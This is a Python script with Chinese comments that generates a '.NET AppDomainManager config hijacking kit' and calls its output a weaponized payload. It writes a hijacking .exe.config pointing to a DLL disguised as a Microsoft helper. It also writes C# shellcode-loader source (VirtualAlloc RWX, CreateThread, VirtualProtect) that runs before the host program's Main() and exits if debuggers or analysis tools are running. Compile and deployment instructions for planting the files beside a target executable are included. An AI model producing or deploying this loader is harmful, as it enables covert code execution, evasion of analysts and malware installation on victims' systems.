import re
import sys
import os
import argparse

# ==========================================================
# .NET AppDomainManager Config 劫持套件生成器
# 配合 ZeroEye 5.0 使用，生成武器化 payload
# ==========================================================

DEFAULT_PAYLOAD_DLL = "Microsoft.Configuration.Helper"
DEFAULT_NAMESPACE = "System.Configuration.Install"
DEFAULT_CLASSNAME = "AssemblyManager"


def extract_assembly_bindings(config_path):
    """
    从原始 .exe.config 中提取 assemblyBinding 块，
    保留这些绑定确保宿主程序正常加载依赖。
    """
    if not os.path.exists(config_path):
        print(f"[!] 警告: 找不到原始 config '{config_path}'，将不保留 assemblyBinding")
        return ""

    try:
        with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        print(f"[!] 读取 config 失败: {e}")
        return ""

    # 提取所有 assemblyBinding 块
    pattern = re.compile(
        r'<assemblyBinding[^>]*>.*?</assemblyBinding>',
        re.DOTALL | re.IGNORECASE
    )
    matches = pattern.findall(content)

    if matches:
        print(f"[*] 从原始 config 中提取了 {len(matches)} 个 assemblyBinding 块")
        return "\n    ".join(matches)

    return ""


def generate_config(exe_name, payload_dll_name, assembly_bindings=""):
    """
    生成 AppDomainManager 注入的 .exe.config 文件
    """
    binding_section = ""
    if assembly_bindings:
        binding_section = f"""
    {assembly_bindings}
"""

    config_template = f"""<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>
  <runtime>
    <appDomainManagerAssembly value="{payload_dll_name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="{DEFAULT_NAMESPACE}.{DEFAULT_CLASSNAME}" />
{binding_section}  </runtime>
</configuration>
"""
    output_path = f"{exe_name}.config"
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(config_template)
    return output_path


def generate_payload_cs(payload_dll_name):
    """
    生成武器化 C# payload 源码 (进程内 shellcode 执行)
    """
    cs_template = f"""using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace {DEFAULT_NAMESPACE}
{{
    public class {DEFAULT_CLASSNAME} : AppDomainManager
    {{
        // ==========================================================
        // Shellcode 配置区 (在此填入 SGN 编码后的数据)
        // 格式: 0xfc, 0x48, 0x83, ...
        // ==========================================================
        private static byte[] buf = new byte[] {{ }};

        // ==========================================================
        // Win32 API 声明
        // ==========================================================
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualProtect(
            IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        // ==========================================================
        // AppDomainManager 入口 (CLR 在 Main() 之前调用)
        // ==========================================================
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {{
            new Thread(() => Execute()) {{ IsBackground = true }}.Start();
            base.InitializeNewDomain(appDomainInfo);
        }}

        // ==========================================================
        // 环境检测 (分析工具黑名单)
        // ==========================================================
        private static bool IsSafe()
        {{
            string[] blacklist = {{
                "x64dbg", "x32dbg", "Wireshark", "ProcessHacker",
                "Procmon", "ida64", "ollydbg", "dnSpy", "de4dot",
                "ilspy", "dotPeek", "Fiddler"
            }};

            try
            {{
                Process[] procs = Process.GetProcesses();
                foreach (Process p in procs)
                {{
                    foreach (string bad in blacklist)
                    {{
                        if (p.ProcessName.IndexOf(bad, StringComparison.OrdinalIgnoreCase) >= 0)
                            return false;
                    }}
                }}
            }}
            catch {{ }}

            return true;
        }}

        // ==========================================================
        // Shellcode 执行 (VirtualAlloc + CreateThread)
        // ==========================================================
        private static void Execute()
        {{
            if (buf.Length == 0) return;
            if (!IsSafe()) return;

            // 分配 RWX 内存
            IntPtr addr = VirtualAlloc(
                IntPtr.Zero,
                (uint)buf.Length,
                0x3000,  // MEM_COMMIT | MEM_RESERVE
                0x40     // PAGE_EXECUTE_READWRITE
            );

            if (addr == IntPtr.Zero) return;

            // 复制 shellcode
            Marshal.Copy(buf, 0, addr, buf.Length);

            // 创建线程执行
            IntPtr hThread = CreateThread(
                IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            if (hThread == IntPtr.Zero) return;

            // 等待解密完成后翻转权限: RWX -> RX
            Thread.Sleep(500);
            uint oldProtect;
            VirtualProtect(addr, (uint)buf.Length, 0x20, out oldProtect); // PAGE_EXECUTE_READ

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }}
    }}
}}
"""
    output_path = "payload.cs"
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(cs_template)
    return output_path


# === PLACEHOLDER_MAIN ===


def generate_files(exe_name, config_path=None, payload_dll_name=None):
    """
    核心生成逻辑
    """
    if not payload_dll_name:
        payload_dll_name = DEFAULT_PAYLOAD_DLL

    # 确保 exe_name 带 .exe 后缀
    if not exe_name.lower().endswith('.exe'):
        exe_name += '.exe'

    # 提取 assemblyBinding
    assembly_bindings = ""
    if config_path:
        assembly_bindings = extract_assembly_bindings(config_path)

    # 生成 config
    config_out = generate_config(exe_name, payload_dll_name, assembly_bindings)

    # 生成 payload.cs
    payload_out = generate_payload_cs(payload_dll_name)

    print(f"\n[+] .NET 劫持套件生成成功！")
    print(f"    1. {config_out} (AppDomainManager 注入 config)")
    print(f"    2. {payload_out} (武器化 C# payload)")
    print(f"\n[*] 编译命令:")
    print(f"    csc /target:library /out:{payload_dll_name}.dll payload.cs")
    print(f"\n[!] 部署指南:")
    print(f"    1. 将 {config_out} 放到目标 {exe_name} 同目录")
    print(f"    2. 将编译好的 {payload_dll_name}.dll 放到同目录")
    print(f"    3. 运行 {exe_name} → payload 在 Main() 之前执行")
    if config_path:
        print(f"\n[*] 已保留原始 assemblyBinding，宿主程序应能正常启动")
    return True


def interactive_mode():
    print("=" * 50)
    print("  .NET AppDomainManager 劫持套件生成器")
    print("=" * 50)

    while True:
        exe_name = input("\n请输入目标 .NET 可执行文件名 (例如 MyApp.exe): ").strip().strip('"')
        if exe_name:
            break
        print("文件名不能为空。")

    config_path = input("请输入原始 .exe.config 路径 (可选，直接回车跳过): ").strip().strip('"')
    if not config_path:
        config_path = None

    payload_dll = input(f"请输入 payload DLL 名称 (默认 '{DEFAULT_PAYLOAD_DLL}'): ").strip()
    if not payload_dll:
        payload_dll = None

    generate_files(exe_name, config_path, payload_dll)
    input("\n按回车键退出...")


def main():
    parser = argparse.ArgumentParser(
        description=".NET AppDomainManager Config 劫持套件生成器"
    )
    parser.add_argument("-t", "--target", help="目标 .NET 可执行文件名 (例如 MyApp.exe)")
    parser.add_argument("-c", "--config", help="原始 .exe.config 路径 (用于保留 assemblyBinding)")
    parser.add_argument("-o", "--output", help="payload DLL 名称 (不带 .dll 后缀)")

    args = parser.parse_args()

    if args.target:
        generate_files(args.target, args.config, args.output)
    else:
        interactive_mode()


if __name__ == "__main__":
    main()
